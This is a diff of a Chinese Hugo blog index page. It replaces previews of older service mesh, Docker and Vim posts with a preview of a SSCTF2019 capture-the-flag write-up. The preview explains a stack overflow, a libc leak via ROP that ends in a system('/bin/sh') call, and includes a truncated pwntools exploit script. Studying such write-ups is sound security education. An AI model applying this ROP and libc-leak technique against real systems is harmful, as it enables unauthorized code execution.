@@ -106,10 +106,6 @@
                     </li>
                     
                     <li>
-                        <a href="/categories/life">life</a>
-                    </li>
-                    
-                    <li>
                         <a href="/categories/tech">tech</a>
                     </li>
                     
@@ -198,107 +194,25 @@
             
 
 <div class="post-preview">
-    <a href="https://alexsandershaw.github.io/2018/04/11/service-mesh-vs-api-gateway/">
+    <a href="https://alexsandershaw.github.io/post/ssctf_pwn/">
         <h2 class="post-title">
-            Service Mesh 和 API Gateway的关系探讨（译文）
+            
         </h2>
 	
         <div class="post-content-preview">
 	
-            API Gateway和Service Mesh的关系是我最近一直在思考的问题，也和同事及社区的朋友之间进行了一些讨论。这篇短文很清晰地总结了两者之间的相似之处以及这两者在微服务架构中的不同用途。
-        
+            SSCTF2019 PWN题题解 stackpwn  首先file,checsec走一遍，64位程序，动态链接，开了NX
+ IDA直接看，main函数：
+ 进入vuln看一下：
+容易看出，存在溢出点，且v1到返回地址的距离为(0x10 + 0x8 = 0x18)。
+  到此为止，我们大致明白了程序的流程：通过vuln函数进行栈溢出，但是程序没有给出system函数，所以需要我们进行两次利用，第一次利用进行地址泄漏，需要使用ROP，第二次真实进行攻击。
+基本思路是首先泄漏出puts函数的实际地址（因为在main函数和溢出之前都使用过了，所以程序内存中存在puts函数的真实地址.使用pop rdi;ret将got表中的存放的puts函数的真实地址利用plt表中的puts函数打印出来，我泄漏我自己），然后泄漏libc的基地址，然后获取system函数的实际地址（libc基地址+system偏移地址）；程序中有/bin/sh字符串，所以直接用就可以了。
+Exp： from pwn import * context.log_level = 'debug' p = process('./stackpwn') offset = 0x18 #0x10+0x8 pop_rdi_ret = 0x0000000000400933 #ROPgadet : rdi bin_sh = 0x0000000000400954 # address of /bin/sh elf = ELF(&quot;./stackpwn&quot;) libc = elf.libc # leak libc payload = 'A'*offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00000000004007E7) #last address is main address p.
+       
         </div>
     </a>
     <p class="post-meta">
-    Posted by 赵化冰 Wednesday, April 11, 2018
-    
-    
-    </p>
-
-</div>
-<hr>
-
-<div class="post-preview">
-    <a href="https://alexsandershaw.github.io/2018/03/29/what-is-service-mesh-and-istio/">
-        <h2 class="post-title">
-            谈谈微服务架构中的基础设施：Service Mesh与Istio
-        </h2>
-	
-        <h3 class="post-subtitle">
-            Service Mesh模式及Istio开源项目介绍
-        </h3>
-	
-        <div class="post-content-preview">
-	
-            作为一种架构模式，微服务将复杂系统切分为数十乃至上百个小服务，每个服务负责实现一个独立的业务逻辑。这些小服务易于被小型的软件工程师团队所理解和修改，并带来了语言和框架选择灵活性，缩短应用开发上线时间，可根据不同的工作负载和资源要求对服务进行独立缩扩容等优势。另一方面，当应用被拆分为多个微服务进程后，进程内的方法调用变成了了进程间的远程调用。引入了对大量服务的连接、管理和监控的复杂性,本文介绍了Service Mesh模式如何应对微服务架构的这些挑战，以及Service Mesh的明星开源项目Istio。
-        
-        </div>
-    </a>
-    <p class="post-meta">
-    Posted by 赵化冰 Thursday, March 29, 2018
-    
-    
-    </p>
-
-</div>
-<hr>
-
-<div class="post-preview">
-    <a href="https://alexsandershaw.github.io/2018/03/13/use-docker-behind-http-proxy/">
-        <h2 class="post-title">
-            如何配置docker使用HTTP代理
-        </h2>
-	
-        <div class="post-content-preview">
-	
-            如何配置docker使用HTTP代理
-        
-        </div>
-    </a>
-    <p class="post-meta">
-    Posted by 赵化冰 Tuesday, March 13, 2018
-    
-    
-    </p>
-
-</div>
-<hr>
-
-<div class="post-preview">
-    <a href="https://alexsandershaw.github.io/2018/02/09/vim-tips/">
-        <h2 class="post-title">
-            Vim Tips
-        </h2>
-	
-        <div class="post-content-preview">
-	
-            Vim Tips and tricks
-        
-        </div>
-    </a>
-    <p class="post-meta">
-    Posted by 赵化冰 Friday, February 9, 2018
-    
-    
-    </p>
-
-</div>
-<hr>
-
-<div class="post-preview">
-    <a href="https://alexsandershaw.github.io/2018/02/09/docker-without-sudo/">
-        <h2 class="post-title">
-            如何使用非root用户执行docker命令
-        </h2>
-	
-        <div class="post-content-preview">
-	
-            如何使用非root用户执行docker命令
-        
-        </div>
-    </a>
-    <p class="post-meta">
-    Posted by 赵化冰 Friday, February 9, 2018
+    Posted by 74oY Blog Monday, January 1, 0001
     
     
     </p>
@@ -316,10 +230,6 @@
         <a href="/page/2/">&larr; Newer Posts</a>
     </li>
     
-    
-    <li class="next">
-        <a href="/page/4/">Older Posts &rarr;</a>
-    </li>
     
 </ul>
 
@@ -345,23 +255,7 @@
                 
             
                 
-                    <a href="/tags/docker" title="docker">
-                        docker
-                    </a>
-                
             
-                
-            
-                
-                    <a href="/tags/istio" title="istio">
-                        istio
-                    </a>
-                
-            
-                
-                    <a href="/tags/kubernetes" title="kubernetes">
-                        kubernetes
-                    </a>
                 
             
                 
@@ -373,16 +267,8 @@
                 
             
                 
-            
-                
                     <a href="/tags/security" title="security">
                         security
-                    </a>
-                
-            
-                
-                    <a href="/tags/service-mesh" title="service-mesh">
-                        service-mesh
                     </a>
                 
             
@@ -392,8 +278,6 @@
                     <a href="/tags/tips" title="tips">
                         tips
                     </a>
-                
-            
                 
             
                 
@@ -554,7 +438,7 @@
                     
                 </ul>
 		<p class="copyright text-muted">
-                    Copyright &copy; 74oY Blog 2019
+                    Copyright &copy; 74oY Blog 2020
                     <br>
                     <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
                     <iframe
